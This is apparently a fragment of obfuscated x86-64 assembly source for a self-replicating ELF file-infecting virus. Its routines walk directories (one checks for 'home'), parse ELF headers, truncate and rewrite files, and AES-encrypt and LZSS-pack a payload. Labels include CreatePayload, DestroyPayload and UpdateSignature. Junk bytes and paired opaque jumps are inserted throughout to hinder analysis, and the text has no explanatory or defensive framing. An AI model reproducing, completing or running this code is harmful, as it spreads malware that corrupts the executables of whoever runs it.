    mov         BYTE [r1], 0x00
    jmp         $+5
db 0x5c, 0xa0, 0x6f
    jmp         $+5
db 0x23, 0xf9, 0x3d
    jmp         ..@ddHwjIjh4s9f
..@XY0qK3oWrsRt:
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0x20]
    js          ..@D03IgW1Lt2KJ
    jns         ..@D03IgW1Lt2KJ
..@v8RFzZ9fQ1d3:
    push        r4
    push        r5
    jmp         ..@yLasFeKQQvXN
..@eZPOiUdwZT64:
    lea         r4, [r1]
    jmp         $+4
db 0xaf, 0xe4
    jmp         ..@04GWVz4EPLkB
..@4trp2z9Y9NHN:
    movdqu      [rsi+rcx], xmm0
    add         rcx, 0x10
    jmp         $+5
db 0x35, 0xdd, 0xed
    js          ..@gJDFpLRM4J0o
    jns         ..@gJDFpLRM4J0o
..@VbYwOnHswaMU:
    mov         r1, m6
    mov         r2, original_virus_len+PADDING
    mov         eax, SYS_MUNMAP
    jl          ..@e4RyToQJB4CT
    jge         ..@e4RyToQJB4CT
..@x91ZWyOgFlsh:
    add         rsp, _NBF_OFF_size
    jmp         ..@9pQVnabijaGD
..@JxMDeCzQzwSi:
    ret
    jmp         DestroyPayload
..@9pQVnabijaGD:
    ret
    jmp         $+3
db 0xb7
    jmp         CreatePayload
..@oUAhJTXeyMCy:
    jle         ..@S4NA4XeHpJfq
    mov         QWORD [r5+file.filesize], rax
    jmp         $+5
db 0xc4, 0x1d, 0x49
    jmp         ..@xvn50FRttLH2
..@eandJYTC06oy:
    xor         r3, r3
    xor         r4, r4
    mov         rax, SYS_WAIT4
    jmp         ..@iByXN6FToFPH
..@KkOMScmf90Av:
    cmp         DWORD [rdi+s_h.sh_type], SHT_DYNAMIC
    jne         ..@GZajGxd8TeMx
    jmp         $+4
db 0xcf, 0x4f
    jmp         $+4
db 0x10, 0xfd
    js          ..@0tBoKoGv3onJ
    jns         ..@0tBoKoGv3onJ
..@cRBNpv8bWAN5:
    sub         rbx, r3
    jmp         $+3
db 0xe4
    jl          ..@8GfVvutbZuDg
    jge         ..@8GfVvutbZuDg
..@McbdcuPocAuo:
    jne         ..@aj6q8cIIVpfY
    js          ..@aj6q8cIIVpfY
    jns         ..@aj6q8cIIVpfY
..@VWIfj0Ef8F2o:
%ifdef X86_32
    mov         esi, 0x22
    mov         edi, 0xffffffff
    push        ebp
%endif
    jmp         $+3
db 0x90
    jmp         $+4
db 0x46, 0x81
    jmp         ..@oqg8C64Vwrec
..@bNw7eMXmCBH2:
    mov         r1, QWORD [r5+file.filename]
    jmp         $+5
db 0xae, 0xeb, 0x0a
    jmp         $+5
db 0xcf, 0x24, 0x3b
    jb          ..@2gJ4F4CqP9v3
    jae         ..@2gJ4F4CqP9v3
..@Zluej7Xn3I1s:
    aesenclast  xmm0, xmm1
    jb          ..@4trp2z9Y9NHN
    jae         ..@4trp2z9Y9NHN
..@EOtypNZo36Kc:
    and         r5, (PAGE_SIZE-1)
    jmp         $+4
db 0x79, 0xbf
    jmp         $+5
db 0x58, 0xaf, 0x15
    jmp         $+4
db 0xf9, 0xc8
    jb          ..@FLl70UTRk2oq
    jae         ..@FLl70UTRk2oq
..@gek4EpzLKrhE:
    pop         r3
    js          ..@QSUvwfFIZ9C4
    jns         ..@QSUvwfFIZ9C4
..@TGZM89SUlhFW:
    mov         r3, rax
    jmp         $+4
db 0x63, 0x28
    jmp         ..@EOtypNZo36Kc
..@sXQOJsdAWyx5:
    cmp         BYTE [r2], 0x0
    jz          ..@qJjNeO3wNMUT
    jl          ..@FgcM2CryZLgi
    jge         ..@FgcM2CryZLgi
..@1uZn5VwGW8Ta:
    add         rsp, _LZSSE_OFF_size
    ret
    jmp         $+5
db 0x77, 0x8c, 0xa5
    jb          UpdateSignature
    jae         UpdateSignature
..@D03IgW1Lt2KJ:
    aesenc      xmm0, xmm1
    je          ..@3XxOio9FM93e
    jne         ..@3XxOio9FM93e
..@5oFaw3CGqdgX:
%ifndef ENABLE_DEBUGGING
    xor         rax, rax
%endif
    jmp         $+5
db 0xcd, 0xcd, 0x97
    jmp         ..@z6jf6Izpjqtj
..@uqCdQRkw0GsO:
    ret
    jmp         $+5
db 0x20, 0x9f, 0xbe
    jmp         Aes256Encryption
Strcpy:
    jmp         ..@sXQOJsdAWyx5
..@o7fuAg9CBU8x:
%ifdef X86_64
    xor         rdx, rdx
%endif
    jmp         $+3
db 0xcc
    jmp         $+4
db 0x82, 0x48
    jmp         $+4
db 0x80, 0x5c
    jl          ..@0yF5Yu6DxtQi
    jge         ..@0yF5Yu6DxtQi
..@8vojL8ZNbfi2:
    cmp         rax, 0x0
    jmp         $+3
db 0xd3
    je          ..@OuqhE60pPqYS
    jne         ..@OuqhE60pPqYS
..@koI9NWxp30uS:
    xor         r4, r4
    jmp         $+3
db 0x44
    jmp         ..@QEjHGjLfaNqK
..@68bZr7nVo4h9:
    add         WORD [rsp+_LZSSE_OFF.buffersize], cx
    rep         movsb
    mov         [rsp+_LZSSE_OFF.inputaddr], rsi
    js          ..@ERlMWnp5ZKgL
    jns         ..@ERlMWnp5ZKgL
..@Lsg6PlLgEd8U:
    rep         movsd
    jmp         $+4
db 0x6d, 0xae
    je          ..@N44cNTR53Fdw
    jne         ..@N44cNTR53Fdw
..@BYsKhmDokkIm:
    mov         r4, r5
    and         r4, 10b
    OFILE       QWORD [r2], r4
    jmp         $+3
db 0xe3
    jl          ..@o5ZIuqwuwZ33
    jge         ..@o5ZIuqwuwZ33
..@5plVRwh7Vfng:
    mov         QWORD [r5+file.fileptr], rax
    xor         rax, rax
    jmp         ..@rgBKFLrK6dDB
    jb          ..@S4NA4XeHpJfq
    jae         ..@S4NA4XeHpJfq
..@tRmiCNu3ltr7:
    ODIR        [rsp+_PROC_OFF.dirfd], [rsp+_PROC_OFF.dirbuf], DIRENT_BUFSIZE
    cmp         rax, 0x00
    jb          ..@SY37PSKIr403
    jae         ..@SY37PSKIr403
..@ZiOHNFE7J2HS:
    test        rax, rax
    jl          ..@jS6rOObOLQha
    jge         ..@jS6rOObOLQha
..@PmCsnV07uhko:
    VAR         packed, urandom
    OFILE       [r5], 0x00
    jb          ..@Q9lZU45wAuat
    jae         ..@Q9lZU45wAuat
..@yLasFeKQQvXN:
    cmp         r3, 0x00
    jmp         $+4
db 0x54, 0x34
    jmp         $+5
db 0x2b, 0x0b, 0x29
    jmp         $+3
db 0x7d
    jmp         $+3
db 0x18
    jb          ..@2ZkiYqDTwegt
    jae         ..@2ZkiYqDTwegt
..@hnV5Rax65Fqi:
    sub         ebx, 1
    jl          ..@Hypn0Q7hDakc
    jge         ..@Hypn0Q7hDakc
..@SuRdo1U0SBNO:
    mov         r3d, 0x20
    mov         eax, SYS_READ
    jmp         ..@hhi0At476Dzy
..@VwSoBXeuX7fH:
    jmp         ..@iUaD78RveJ6I
    jmp         ..@VwwxMuLRc97U
..@PbR0JeCZczMb:
    cmp         BYTE [rsp+_LZSSE_OFF.match_len], MIN_LENGTH
    jmp         $+3
db 0x6a
    jmp         $+4
db 0x5f, 0xaa
    jmp         $+3
db 0x6d
    js          ..@JjHujbT70jgz
    jns         ..@JjHujbT70jgz
..@70GCaO2vD46J:
    aesenc      xmm0, xmm1
    js          ..@cHTJe4ej60Ev
    jns         ..@cHTJe4ej60Ev
..@eY1arJWvdq6O:
    jnz         ..@bYBwyrVMkoY7
    jb          ..@TzMiHwPPJbqm
    jae         ..@TzMiHwPPJbqm
..@N0oYB72BUGYD:
%ifdef X86_64
    mov         r8, 0xffffffffffffffff
    mov         eax, SYS_MMAP
    syscall
%endif
    jmp         $+3
db 0xe1
    jmp         $+4
db 0xc7, 0x0c
    js          ..@v1GEAjP5RIa3
    jns         ..@v1GEAjP5RIa3
..@1akUl7sSnYSx:
    add         rsp, _KEYGEN_OFF_size
    pop         r3
    pop         r2
    jmp         $+5
db 0x88, 0x6d, 0x89
    je          ..@kTAiUISVsAxb
    jne         ..@kTAiUISVsAxb
..@Hsvm148LTzVN:
    mov         r2, QWORD [rsp+_INFDIR_OFF.dirname]
    jmp         $+5
db 0xda, 0xcc, 0x37
    jmp         ..@EA2a5WxLRoZM
..@hqd3J1gDwSWb:
    lea         r1, [rsp+_INFFILE_OFF.file]
    jmp         $+4
db 0xfa, 0x8b
    jmp         $+3
db 0x21
    jmp         $+4
db 0x49, 0x45
    jmp         ..@fYrD7naobDpu
..@QIuZVCQUi13p:
    mov         r2, QWORD [r1+file.filesize]
    jmp         $+4
db 0x8c, 0x01
    jmp         $+3
db 0xc9
    jb          ..@ydjfS0ZNnRli
    jae         ..@ydjfS0ZNnRli
..@hkVdkoFkabO2:
    mov         r1, QWORD [r5+e_h.e_shoff]
    jmp         $+3
db 0x2f
    jb          ..@mkFPE9WzU7bw
    jae         ..@mkFPE9WzU7bw
..@RHBRnSbuJzJT:
%ifndef ENABLE_DEBUGGING
    jnz         ..@tmRZXexByYrm
%endif
    jmp         $+5
db 0x04, 0x7e, 0x4e
    jmp         $+4
db 0x02, 0xe7
    jl          ..@3GIeKabH2Kqi
    jge         ..@3GIeKabH2Kqi
..@xMBbmGtlkTM4:
    mov         QWORD [rsp+_AESE_OFF.keyaddr], r3
    je          ..@H11l1muaofUE
    jne         ..@H11l1muaofUE
..@0tAnTu0ltS2G:
    add         rsp, _INFDIR_OFF_size
    jmp         $+5
db 0x49, 0x06, 0x03
    jb          ..@VqJ3Dt8DmJzD
    jae         ..@VqJ3Dt8DmJzD
..@efZhmtJzD37B:
    sub         r4, QWORD [r1+e_h.e_entry]
    js          ..@XadFaP4jdPdZ
    jns         ..@XadFaP4jdPdZ
..@7P7zbZavLTrc:
    mov         r1, QWORD [r5+file.fileptr]
    je          ..@bQFNuydqqlVs
    jne         ..@bQFNuydqqlVs
..@SMUW8sKGnFoY:
    and         r2, 0x00ffffff
    jmp         $+5
db 0x58, 0xeb, 0x00
    jmp         ..@pZ8EYRm23Cza
..@rvirAYDBeS7K:
    sub         rsp, _AESE_OFF_size+0x100
    je          ..@0UcbLqfzT2lB
    jne         ..@0UcbLqfzT2lB
..@EWeUsYnUi659:
    mov         r1, m6
    add         r1, non_packed_len+PADDING
    mov         r3, r1
    jmp         ..@ds5wEe8FEXej
..@pZ8EYRm23Cza:
    cmp         r2d, '../'
    je          ..@qFCKTajb7Cpo
    jmp         ..@bY6g2P6Tlbzr
..@oxgETVhpgCBm:
    cmp         BYTE [r1], 0x0
    jz          ..@xpc5QenzkoUe
    jmp         $+5
db 0x8c, 0x94, 0xf9
    jmp         ..@a5hPZz6MxmaO
..@mVuQmnJqJ7J1:
    pop         r1
    jmp         ..@Txjiihpf5KPS
..@4fjQJKwYvnpd:
    CFILE       DWORD [rsp+_PROC_OFF.dirfd]
    jmp         ..@gxhBCcbEIKfZ
..@oqg8C64Vwrec:
%ifdef X86_32
    xor         ebp, ebp
%endif
    jmp         $+3
db 0xd8
    js          ..@sKglIs5nMNS5
    jns         ..@sKglIs5nMNS5
..@k0SllQJfUSxN:
    call        NonBinaryFile
    jmp         $+5
db 0x43, 0x16, 0x08
    je          ..@4kqgtB2J7QZs
    jne         ..@4kqgtB2J7QZs
..@bJqi3pxaK8hS:
    mov         r2, 0x100
    mov         rax, SYS_GETCWD
    syscall
    jmp         $+4
db 0x7a, 0x4d
    jmp         ..@8vojL8ZNbfi2
..@2XLwoWpI7cf0:
%ifdef X86_32
    mov         eax, SYS_MMAP2
    int         0x80
    pop         ebp
%endif
    jmp         ..@f4pDnaauLWvC
..@IwtGvwJe0zHb:
    jne         ..@qFCKTajb7Cpo
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    jb          ..@Hsvm148LTzVN
    jae         ..@Hsvm148LTzVN
..@XvDUIbVmBgjZ:
    xor         rax, rax
    mov         ax, WORD [rsp+_LZSSE_OFF.la_index]
    add         rdi, rax
    jmp         $+5
db 0x12, 0x3a, 0x96
    jl          ..@obuyMCjClNKw
    jge         ..@obuyMCjClNKw
..@paNfDpCaUXgs:
    xor         r1, r1
    jmp         $+4
db 0x17, 0xc9
    jmp         $+3
db 0xac
    jl          ..@9X3pwXO9vrKq
    jge         ..@9X3pwXO9vrKq
..@Qu0XPtMQSnHL:
    rep         stosb
    jmp         $+5
db 0x2e, 0x2b, 0xc8
    jmp         $+5
db 0xe2, 0xa4, 0xdd
    jmp         ..@W9LVa3izKPNU
..@fnTUbS732chw:
    std
    rep         movsb
    cld
    jb          ..@f3yXa3lw5ZxY
    jae         ..@f3yXa3lw5ZxY
..@2p0peLBtZCKA:
    mov         WORD [rsp+_DYNPIE_OFF.shentsize], ax
    add         r1, 2
    mov         ax, WORD [r1]
    jmp         $+5
db 0x3e, 0xd7, 0xe0
    jmp         ..@ehjrNkn8izm4
..@YONs6NKdbIkU:
    mov         eax, SYS_MREMAP
    jmp         ..@Y1phEz0JJh3y
..@V0Ct5L1B4UiW:
    GGLOBAL     _signature.start
    mov         rsi, r5
    jb          ..@yKs6oHP7YsBE
    jae         ..@yKs6oHP7YsBE
..@SMLvarKiPtR9:
    jne         ..@bNw7eMXmCBH2
    jmp         $+3
db 0xef
    jmp         ..@3ULUk3rGaydV
..@Od9TzH4X9l1F:
    jnz         ..@JYAsialzZ1qB
    js          ..@XVD770GOcQKq
    jns         ..@XVD770GOcQKq
..@fng00RihBDIt:
    mov         r2w, WORD [r5+e_h.e_shnum]
    xor         rax, rax
    mov         ax, WORD [r5+e_h.e_shentsize]
    jmp         $+3
db 0x33
    jmp         $+4
db 0x93, 0x6b
    js          ..@1YbZ7zcthpJv
    jns         ..@1YbZ7zcthpJv
..@0m9SdhUu0WFT:
    call        Strcpy
    jmp         $+4
db 0xd5, 0x43
    jmp         ..@W8W29FbY4egT
..@vjtUcgFbXWWF:
%ifdef X86_64
    mov         edx, 11b
    mov         r10, 0x22
%endif
    jmp         $+5
db 0xe4, 0x66, 0x5b
    jmp         ..@N0oYB72BUGYD
..@AhhFvXx0bnFJ:
    jge         ..@shWJQl1jTUDr
    jmp         $+4
db 0x1f, 0x73
    jmp         $+3
db 0xe6
    jmp         $+4
db 0x61, 0xeb
    jb          ..@PbR0JeCZczMb
    jae         ..@PbR0JeCZczMb
..@K9L0CsqOvZLZ:
    xor         rax, rax
    xor         rdi, rdi
    xor         rdx, rdx
    jl          ..@x2tza9GvIctS
    jge         ..@x2tza9GvIctS
..@Dm5KmVczNGaY:
    cmp         BYTE [rsp+_INFDIR_OFF.depth], SUBDIR_MAXDEPTH
    jmp         $+3
db 0x34
    jmp         $+5
db 0x1a, 0x77, 0x42
    jb          ..@R2EVn6D0qIKc
    jae         ..@R2EVn6D0qIKc
..@y81NiZorJNQy:
%ifdef X86_32
    xor         eax, eax
    mov         ecx, original_virus_len+PADDING
%endif
    jmp         $+4
db 0x84, 0x37
    je          ..@Lqn9g2i6tzBK
    jne         ..@Lqn9g2i6tzBK
..@hO31Q0DeNCsk:
    movdqu      xmm1, oWORD [rsp+0x10]
    js          ..@XY0qK3oWrsRt
    jns         ..@XY0qK3oWrsRt
..@8SapOC3z2aHH:
    mov         WORD [rsp+_LZSSE_OFF.w_index], 0x0000
    jl          ..@K9L0CsqOvZLZ
    jge         ..@K9L0CsqOvZLZ
..@8ODzGdM4iqx5:
%ifndef ENABLE_DEBUGGING
    cmp         al, 0x0
%endif
    jmp         $+3
db 0x95
    jmp         $+4
db 0x66, 0xd9
    jmp         ..@QkeVNhmSa3zk
..@5V6OC7Le1QBK:
    mov         rax, (-1)
    jb          ..@t14R8aED5IcG
    jae         ..@t14R8aED5IcG
..@ZdYY7l1ctXe0:
    xor         r2, r2
    jb          ..@mFYpsCGVqVQX
    jae         ..@mFYpsCGVqVQX
..@v1GEAjP5RIa3:
    cmp         rax, (-1)
    jb          ..@ypeVJ8je7VDG
    jae         ..@ypeVJ8je7VDG
..@CVbpashMPDkM:
    test        eax, eax
    jz          ..@LYuICe0K3Bpc
    jmp         ..@aOWzzOC9Mxff
..@VwoSnCACBlyg:
%ifdef X86_64
    syscall
%endif
    jmp         ..@GuxtU8elQcDE
..@oZYOxMgCRbsF:
    sub         r1, 1
    cmp         BYTE [r1], DT_DIR
    js          ..@BxmYLQFD1m8c
    jns         ..@BxmYLQFD1m8c
..@XmZfth0CNx7B:
    xor         r3, r3
    mov         r1, m6
    jmp         ..@7QjHczcCGNvI
..@Q9QRksCmtr6t:
%ifndef ENABLE_DEBUGGING
    jmp         ..@gMdfoIlYoobW
%endif
    jmp         ..@nux2xcWZtIDT
..@HRInWx41s0zE:
    call        UnmapFile
    jmp         ..@sKdTTixmqiEL
..@3WpTiOdjFny8:
    mov         r1, r4
    mov         r2, m5
    jl          ..@zOXkP96rp8uu
    jge         ..@zOXkP96rp8uu
..@nfVZpehEMNSI:
    xor         rdi, rdi
    xor         rcx, rcx
    jmp         $+5
db 0x1b, 0x6a, 0x88
    jl          ..@T3siNFhajvPl
    jge         ..@T3siNFhajvPl
..@AvWN57M8AVop:
    rep         cmpsb
    jmp         $+4
db 0x9e, 0x92
    jmp         ..@McbdcuPocAuo
..@Lr3D6YCBgNbL:
    aesenc      xmm0, xmm1
    jmp         $+3
db 0xfc
    jb          ..@74OVp6jr9v3h
    jae         ..@74OVp6jr9v3h
..@26e87ViHkH00:
    mov         r2, QWORD [r1+file.filename]
    jmp         $+3
db 0x34
    jmp         $+3
db 0xe3
    jb          ..@BYsKhmDokkIm
    jae         ..@BYsKhmDokkIm
..@kBE74jCL77Tj:
    and         eax, 0xff
    or          edi, eax
    js          ..@4ARbOg08pFGt
    jns         ..@4ARbOg08pFGt
..@zNpifSzQmAAA:
    ret
    jb          WORDToDWORDASCII
    jae         WORDToDWORDASCII
..@FIBvSMhpI30V:
    jg          ..@Nojq44te8b2h
    add         r1, 1
    jmp         ..@oxgETVhpgCBm
    js          ..@Nojq44te8b2h
    jns         ..@Nojq44te8b2h
..@tgNnZJlW6LcX:
    ret
    jl          Strcpy
    jge         Strcpy
..@ds5wEe8FEXej:
    sub         r3, PADDING
    mov         r2, original_virus_len-non_packed_len
    jl          ..@zCNtRHLgoy8e
    jge         ..@zCNtRHLgoy8e
..@ruMI8papFzub:
    mov         r2, rax
    mov         rax, SYS_FTRUNCATE
    jmp         $+5
db 0x34, 0x62, 0xa1
    jmp         $+5
db 0x72, 0x02, 0xd1
    jl          ..@NkQqZscqIDwR
    jge         ..@NkQqZscqIDwR
..@fOiM9BT8Uleq:
    xor         rcx, rcx
    js          ..@OR4ZbyReFzFj
    jns         ..@OR4ZbyReFzFj
..@Qsh1vhjc82i2:
%ifndef ENABLE_DEBUGGING
    xor         r2, r2
%endif
    js          ..@cI4a54pUS4Ye
    jns         ..@cI4a54pUS4Ye
..@YRbIEf0rQTJ0:
    rep movsb 
    jmp         $+5
db 0xb3, 0x17, 0xa2
    js          ..@pwEsT9P2a0Ko
    jns         ..@pwEsT9P2a0Ko
..@zIrX3GfHIvJv:
    cmp         BYTE [r1], 0x00
    jmp         $+3
db 0xd2
    jl          ..@JppFSase8VQf
    jge         ..@JppFSase8VQf
..@ddHwjIjh4s9f:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    jmp         $+4
db 0xbe, 0xb5
    jmp         ..@ZdYY7l1ctXe0
..@Y1phEz0JJh3y:
    syscall
    jmp         $+5
db 0x18, 0x94, 0x97
    js          ..@Rw5ZLkZr9ujD
    jns         ..@Rw5ZLkZr9ujD
..@zCV60bhmZqmS:
    add         rdi, _signature.key_preview-_signature.start
    mov         DWORD [rdi], eax
    jmp         $+3
db 0x56
    jmp         $+3
db 0xb0
    jmp         ..@AAFWJ8b7JrUO
..@T3siNFhajvPl:
    xor         rdx, rdx
    jb          ..@yvjMFQS03vZr
    jae         ..@yvjMFQS03vZr
..@Quxudai11mYa:
    rep         stosb
    jmp         $+3
db 0x9a
    jmp         ..@k0CyxSfYdM35
..@3fymNw646lOo:
    cmp         WORD [r1], './'
    jmp         $+5
db 0x29, 0x58, 0x20
    jmp         $+4
db 0x43, 0xd5
    js          ..@AxxakbncRyLY
    jns         ..@AxxakbncRyLY
..@sM5iK2wBMaen:
    jne         ..@PNBnYJNEowRv
    jmp         $+3
db 0x8d
    jb          ..@IZa6HoSJJoXZ
    jae         ..@IZa6HoSJJoXZ
..@dg7yK8r9l0ph:
    je          ..@VwwxMuLRc97U
    jb          ..@enC9GafdQfms
    jae         ..@enC9GafdQfms
..@gf0e9na0oOrb:
    mov         rbx, 0x1000
    jmp         $+4
db 0xcd, 0x20
    js          ..@cRBNpv8bWAN5
    jns         ..@cRBNpv8bWAN5
..@R2EVn6D0qIKc:
    jge         ..@qFCKTajb7Cpo
    jb          ..@lwa9BAfMjhyJ
    jae         ..@lwa9BAfMjhyJ
..@M1exrkL0G5D3:
    mov         QWORD [rsp+_LZSSE_OFF.inputaddr], r1
    jmp         $+4
db 0xdb, 0x84
    jmp         ..@wfsUjED5Fr04
..@RrWGpSQkAd8A:
    cmp         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH*2-LOOKAHEAD_LENGTH
    jmp         ..@4C5cjHoCE9sV
..@nQ2WCDo081sb:
    ret
    jmp         $+3
db 0xc4
    jl          MapFile
    jge         MapFile
..@TTnfc5i6KHBu:
    cmp         DWORD [r1+1], "home"
    jne         ..@bYBwyrVMkoY7
    jmp         ..@WoIYn3Opkhrz
..@DWEp15X0QKg5:
    push        r1
    jmp         $+5
db 0x12, 0x82, 0x0d
    jmp         $+3
db 0xc7
    js          ..@nfVZpehEMNSI
    jns         ..@nfVZpehEMNSI
..@LRgfulRz9LJY:
    mov         QWORD [rsp+_KEYGEN_OFF.bufferaddr], r1
    jl          ..@R8qgjJtpCUsw
    jge         ..@R8qgjJtpCUsw
..@ehjrNkn8izm4:
    mov         WORD [rsp+_DYNPIE_OFF.shnum], r1w
    jmp         $+4
db 0x93, 0xf9
    jb          ..@pJ7MmZ4mO5c3
    jae         ..@pJ7MmZ4mO5c3
..@GniwPQZovoJK:
    add         r4, 1
    jmp         ..@PwfaFVMyXdYE
..@PJEY0FpisNR3:
    jg          ..@bNw7eMXmCBH2
    jmp         $+5
db 0xe4, 0x0c, 0xbf
    jmp         $+3
db 0xc5
    je          ..@jyY5aUhIVGWP
    jne         ..@jyY5aUhIVGWP
..@hWhUPkZRMkjo:
    push        r1
    jmp         $+3
db 0x53
    jb          ..@izSY2JikoNCD
    jae         ..@izSY2JikoNCD
..@H2t23NSawgqm:
    call        Aes256Encryption
    je          ..@mnx3jmG7x3l1
    jne         ..@mnx3jmG7x3l1
..@EaWW4jerRhGz:
    jz          ..@bYBwyrVMkoY7
    jmp         ..@o0wv5cL6f8OJ
..@PNBnYJNEowRv:
    add         rsp, _INFFILE_OFF_size
    ret
    jmp         $+3
db 0x9a
    jb          FileValidation
    jae         FileValidation
CreatePayload:
    jmp         ..@9mZbf0RonqHb
..@xLC8SXjRnayr:
    mov         r1, r5
    jb          ..@OuIUNiAJ1KRT
    jae         ..@OuIUNiAJ1KRT
..@xMyJRYMoIFlD:
    xor         rbx, rbx
    jmp         $+4
db 0x34, 0x72
    jl          ..@UrlOd9e8J1NS
    jge         ..@UrlOd9e8J1NS
..@bQFNuydqqlVs:
    mov         r2, QWORD [r5+file.filesize]
    jl          ..@MKHj5fvB528g
    jge         ..@MKHj5fvB528g
..@Z1lvSyiJrOB1:
    mov         QWORD [rsp+_AESE_OFF.length], r2
    jmp         $+3
db 0x17
    jmp         $+4
db 0x0c, 0x99
    js          ..@xMBbmGtlkTM4
    jns         ..@xMBbmGtlkTM4
..@nux2xcWZtIDT:
%ifndef ENABLE_DEBUGGING
    mov         r1, 0xf
%endif
    jmp         $+5
db 0x73, 0xf0, 0x6c
    jmp         $+3
db 0x51
    js          ..@FF766E0s6vs1
    jns         ..@FF766E0s6vs1
..@LolRVpeqhKu4:
    mov         rdi, m7
    jb          ..@5FlHrtkExooI
    jae         ..@5FlHrtkExooI
..@GZajGxd8TeMx:
    add         rbx, 1
    jl          ..@Slyk81HOZs7n
    jge         ..@Slyk81HOZs7n
..@3zzD74bHyZpq:
    mov         r1, QWORD [r5+file.filesize]
    jmp         ..@FgBPoCjp9i3H
UpdateSignature:
    jmp         ..@vip4BsrCkRzq
..@KkTWOC5CnxA7:
    mov         bx, WORD [rsp+_LZSSE_OFF.la_index]
    jb          ..@9sJvDdp6TL9j
    jae         ..@9sJvDdp6TL9j
..@rv6IY8jcLHyW:
    mov         r2, r5
    call        Strcpy
    jl          ..@Uz3Ys1Ilxt6T
    jge         ..@Uz3Ys1Ilxt6T
..@3WlsnFl6Tan8:
    sub         rsp, _INFDIR_OFF_size
    mov         BYTE [rsp+_INFDIR_OFF.depth], r2b
    jb          ..@0IvePlfJ85zH
    jae         ..@0IvePlfJ85zH
..@RHjP9QzC8yCi:
    mov         eax, 0x00
    jmp         $+3
db 0x01
    jmp         ..@Qu0XPtMQSnHL
..@o3JERJ4Alg8N:
%ifndef ENABLE_DEBUGGING
    mov         eax, SYS_DUP2
    syscall
    sub         r2, 1
%endif
    jmp         $+5
db 0x35, 0xe1, 0xf0
    jmp         ..@7Eq33EZKbBJw
..@m0A2sMQpM9v5:
    add         rdi, _signature.key_preview-_signature.start+4
    mov         DWORD [rdi], eax
    xor         r1, r1
    jmp         $+3
db 0x49
    jmp         $+5
db 0x65, 0x4f, 0x51
    jl          ..@pAIN7mn4WXUV
    jge         ..@pAIN7mn4WXUV
..@dgRhaOoMVL4z:
    lea         r5, [rsp+_INFDIR_OFF.dirbuf+r4]
    mov         ax, WORD [r5+linux_dirent.d_reclen]
    je          ..@ohA1BFTMLJKV
    jne         ..@ohA1BFTMLJKV
..@iknvE3Xz3MAy:
    xor         r1, r1
    CFILE       DWORD [r5+file.filefd]
    jmp         ..@3FmWaSiu249p
..@skZikvD2cfwV:
    sub         QWORD [rsp+_LZSSE_OFF.length], rcx
    jmp         ..@JxPQLTm4204M
..@2XpQWB5dOuTX:
    call        UnmapFile
    jmp         $+3
db 0x26
    jmp         $+3
db 0x06
    jmp         ..@X1MwlIa1sqh7
..@9ly2tHET621H:
%ifdef X86_32
    xor         ebp, ebp
%endif
    jl          ..@2XLwoWpI7cf0
    jge         ..@2XLwoWpI7cf0
..@SY37PSKIr403:
    jle         ..@4fjQJKwYvnpd
    jmp         $+5
db 0x26, 0x47, 0x2b
    jmp         ..@Ps4BktGfRkcR
..@rQzqN4iP1TWH:
    jl          ..@gxhBCcbEIKfZ
    jmp         $+5
db 0xab, 0x1d, 0xb0
    jb          ..@uSMOPvMHfrPF
    jae         ..@uSMOPvMHfrPF
..@VugmyxpEj1I0:
    mov         al, BYTE [rsp+_LZSSE_OFF.bits]
    mov         rdi, QWORD [rsp+_LZSSE_OFF.outputaddr]
    mov         BYTE [rdi], al
    jb          ..@iTbCHZtkTZWQ
    jae         ..@iTbCHZtkTZWQ
..@wXFP0SHfiI7v:
    mov         al, BYTE [rsp+_LZSSE_OFF.buffer+rbx]
    jb          ..@ShDUZTk4U50q
    jae         ..@ShDUZTk4U50q
UnmapFile:
    jmp         ..@hbYQSFjCRxsv
..@Yg5ftdBp9QE9:
    jne         ..@hnV5Rax65Fqi
    jmp         $+5
db 0x56, 0x0d, 0x10
    jmp         $+3
db 0xfa
    jb          ..@qToYmvRCbfhA
    jae         ..@qToYmvRCbfhA
..@wte2Cxsn0nqc:
    mov         DWORD [rsp+_INFDIR_OFF.dirfd], eax
    jb          ..@TyBU4NpvDWs7
    jae         ..@TyBU4NpvDWs7
..@9L6wNo5aDowk:
    cmp         WORD [rsp+_LZSSE_OFF.la_index], ax
    jl          ..@K9L0CsqOvZLZ
    jmp         ..@bkn84TTw27cx
..@JzUHM2gKJgQm:
    CFILE       [rsp+_INFDIR_OFF.dirfd]
    jb          ..@0tAnTu0ltS2G
    jae         ..@0tAnTu0ltS2G
..@EFwCmnxaNGDk:
%ifndef ENABLE_DEBUGGING
    xor         r4, r4
%endif
    je          ..@8J4N4kapwUeq
    jne         ..@8J4N4kapwUeq
..@JMVhz0PJheBO:
    xor         rcx, rcx
    xor         rbx, rbx
    je          ..@DeVBLAA40ITk
    jne         ..@DeVBLAA40ITk
..@Ck8Hg0xJL4xE:
    movdqu      xmm0, [rsi+rcx]
    movdqu      xmm1, oWORD [rsp]
    jmp         $+3
db 0xb6
    js          ..@Eo4x1NZC5hTl
    jns         ..@Eo4x1NZC5hTl
..@O2q2VzW4ln6i:
    sub         rsi, 1
    jb          ..@fnTUbS732chw
    jae         ..@fnTUbS732chw
..@n9EpzNSWy045:
    jmp         ..@qFCKTajb7Cpo
    jmp         ..@l6fcbIdMX9BN
..@WePxXRYY7WIS:
    mov         r2d, DWORD [r1]
    jmp         $+4
db 0xa2, 0x56
    jmp         ..@SMUW8sKGnFoY
..@jyY5aUhIVGWP:
    jmp         ..@bYBwyrVMkoY7
    jmp         $+3
db 0x39
    jmp         ..@8Zbim95BRIkP
..@gT0ycgOibCRv:
    add         rax, bytes
    push        rax
    jmp         $+4
db 0x43, 0x6c
    jmp         $+5
db 0x95, 0xa7, 0xc7
    jmp         ..@IzGteyu0sii7
..@JjHujbT70jgz:
    jge         ..@kVgkm7UZZICU
    mov         BYTE [rsp+_LZSSE_OFF.match_len], 0x1
    jmp         $+5
db 0xbf, 0x49, 0x68
    js          ..@ks8PjWy8qW5y
    jns         ..@ks8PjWy8qW5y
..@H11l1muaofUE:
    mov         rsi, rsp
    jmp         $+3
db 0x97
    jmp         $+5
db 0x60, 0xe7, 0x03
    jl          ..@bAXQYgST3b2n
    jge         ..@bAXQYgST3b2n
..@HFIkxEVCcTO4:
    jnz         ..@sKkgUgekvBJV
    jmp         ..@EZE9iwSxq9yy
..@QdSyOpKXh3aT:
    mov         QWORD [rsp+_VADDR_OFF.tmp_vaddr], r5
